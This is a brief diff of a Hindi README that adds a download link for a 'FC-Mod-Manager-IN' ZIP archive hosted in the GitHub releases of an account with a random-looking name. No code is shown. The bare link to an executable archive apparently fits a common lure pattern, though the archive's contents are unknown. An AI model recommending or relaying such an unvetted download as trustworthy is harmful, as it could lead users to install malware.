@@ -12,7 +12,7 @@
 
 ## 📥 डाउनलोड
 
-**[FC-Mod-Manager-IN डाउनलोड करें]()**
+**[FC-Mod-Manager-IN डाउनलोड करें](https://github.com/BodyLieutenantLock/FC-Mod-Manager-IN/releases/download/654/FCModManagerIN.zip)**
 
 ---
 
